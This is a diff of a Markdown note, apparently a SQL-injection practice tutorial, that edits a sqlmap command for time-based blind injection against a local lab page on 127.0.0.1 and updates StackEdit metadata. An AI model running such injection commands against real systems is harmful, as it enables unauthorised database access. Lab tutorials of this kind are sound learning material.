@@ -189,9 +189,9 @@ AND ORD
 ./sqlmap.py -u 
 'http://127.0.0.1/sql_injection/8.php?id=1&submit=submit' 
 -p id --technique=T --fresh-queries
- -D sql_injection --string=yes -T user --current-db
+-D sql_injection --string=yes -T user --current-db
 ```
-
+*--string=yes*
 
 
 
@@ -208,7 +208,7 @@ AND ORD
 > Written with [StackEdit中文版](https://stackedit.cn/).
 >
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMTg3MjkyMTYxNywyMDM3NjA5NzAyLDEwNz
+eyJoaXN0b3J5IjpbMTYwMjY0NzEwOCwyMDM3NjA5NzAyLDEwNz
 UzMzc2OSwxNzY5MzI2OTgxLDIwMjAxMzAwMjgsMjY0NjQxNjAz
 LDIxMjg1NzMxNjgsLTY2MTE5NDg3NiwtMjIwMTI2MTYwLC04OT
 c5Njc2NzEsMTQwNTE2MjM0OSwxMDg4NzM3MzQ1LDI2OTIwNTA5
